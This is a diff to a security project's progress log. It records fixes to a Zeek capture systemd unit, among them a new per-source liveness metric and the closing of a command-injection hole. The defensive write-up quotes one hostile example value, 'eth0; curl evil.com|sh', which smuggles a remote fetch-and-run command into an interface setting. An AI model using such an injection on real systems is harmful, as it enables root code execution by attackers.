@@ -28,7 +28,7 @@ matching the M12/M13/M14 pattern.
 | [M18 — ECS Pipeline & Field-Mapping Integrity](https://github.com/voltron-1/Suburban_SOC/milestone/23) | ⏸️ 12/16 closed, 4 not actionable (no actionable work left) | Logstash rename/copy drift vs. suburban-soc-ecs.yml's claims, dashboard fields that don't exist on the real mapping, truncation ceilings, index-template rollover |
 | [M19 — SOC Platform Credential & Secret Hygiene](https://github.com/voltron-1/Suburban_SOC/milestone/24) | ✅ 7/7 closed (corrected 2026-08-28: the restructure's "6" undercounted by one; #374 was already assigned) | Cleartext passwords in argv, ES role drift with no sync check, no live self-check on role regressions, unpinned CI toolchain, ES network exposure |
 | [M20 — SOAR Response-Path Hardening](https://github.com/voltron-1/Suburban_SOC/milestone/25) | ✅ 6/6 closed | Residual hive-mind-broker/#277 hardening, autonomous-isolation MAC-gate policy decision |
-| [M21 — Zeek Sensor Operational Resilience](https://github.com/voltron-1/Suburban_SOC/milestone/26) | 3 | No liveness/dead-man detection for a silently-dead capture source; symlink/ownership primitives; CA trust-on-every-use |
+| [M21 — Zeek Sensor Operational Resilience](https://github.com/voltron-1/Suburban_SOC/milestone/26) | ⏳ 1/3 closed — 2 open (#270, #321) | Symlink/ownership primitives on zeek-host-capture.service; intel-refresh.service config/data co-location + unpinned CA trust-on-every-use |
 | [M22 — Compliance & Documentation Accuracy](https://github.com/voltron-1/Suburban_SOC/milestone/27) | 5 (corrected 2026-08-18 — the 08-16 restructure's "3" predates 3 later review-follow-up filings; #289 also closed invalid same day) | Docs/compliance matrix citing dead code as a live control; a tagging mandate never implemented; analyst-facing rule text leaking implementation detail |
 
 **Full per-issue detail lives in each milestone's own GitHub issue list**
@@ -245,6 +245,56 @@ unattended multi-issue runs.
   review's non-blocking observation (`deploy_detections.sh`'s local
   venv doesn't pin the Python version the way CI does). **This closes
   M19 — 7/7 issues complete.**
+
+**M21 progress:**
+
+- [x] **#320 (security-adjacent, reliability) — COMPLETE, MERGED (PR #477)** —
+  three related findings from a security-auditor review of
+  `configs/systemd/zeek-host-capture.service` (the always-on production
+  Zeek sensor). (1) No per-source liveness detection: the existing
+  `metric_ingest_lag_seconds()` checks the newest document across EVERY
+  source in `logstash-security-*`, so a real Zeek outage went undetected
+  because other sources (Endpoint/Sysmon, mock traffic) kept it reading
+  healthy — found only by manual investigation. Added a new
+  `metric_zeek_ingest_lag_seconds()` filtering specifically to
+  `event.dataset:zeek.*` (a `wildcard` query against that field's explicit
+  `keyword` mapping), wired into `TARGETS`/`LOWER_BETTER`/`BREACH_IF_NA`/
+  `metric_fns` following this file's established per-metric pattern. (2)
+  `CAPTURE_IFACE` (operator-configurable via the untracked
+  `/etc/default/zeek-host-capture`) was interpolated by systemd directly
+  into a `bash -c '...'` string before bash parsed it — a value like
+  `eth0; curl evil.com|sh` could execute as root on the next restart.
+  Fixed by factoring the tcpdump|docker pipeline out into a new
+  `scripts/setup/host_capture.sh`, invoked with the interface as a quoted
+  positional argument instead (`IFACE="${1:?...}"`, used as `"$IFACE"`
+  throughout) — systemd's own `${VAR}` substitution never re-splits or
+  re-interprets a value as shell syntax, so once there's no `bash -c`
+  layer left to re-parse it, a hostile value can only ever become one
+  inert argv element. (3) Hardcoded `tjlam` user / repo path reduced
+  portability — replaced with `Environment=SOC_USER`/`SOC_REPO`,
+  overridable via the existing env file, referenced in the active
+  ExecStartPre/ExecStart directives (historical prose comments describing
+  real past incidents on the actual host were deliberately left
+  unchanged). Since the pinned `zeek/zeek` image invocation moved out of
+  the systemd unit into the new script, `tests/pipeline/
+  test_zeek_image_pin.py`'s tracked "4 real capture paths" list was
+  updated to match. Two rounds of parallel security/code review both
+  surfaced real findings that were fixed in the same commit: no test in
+  the suite would have caught a regression back to the vulnerable
+  `CAPTURE_IFACE` shape (added `tests/pipeline/
+  test_zeek_capture_iface_hardening.py`, verified it actually fails
+  against the old vulnerable pattern before finalizing), and a stale
+  cross-reference in `metric_capture_loss_percent()`'s own docstring
+  (updated to point at the new metric). A deliberate, documented scope
+  decision: `SOC_USER`/`SOC_REPO` are still interpolated directly into
+  the ExecStartPre `bash -c` strings rather than also converted to
+  scripts with positional arguments — low blast radius (writing the env
+  file already requires root, same framing the issue itself used for
+  `CAPTURE_IFACE`) and this unit's own footer documents a prior
+  hardening attempt that broke production and had to be reverted, so
+  further restructuring of an already-fragile, live-relied-upon unit was
+  deliberately kept out of scope. No live systemd/Docker/ES available in
+  this environment — verified via the full test suite plus `shellcheck`.
 
 **M20 progress:**
 
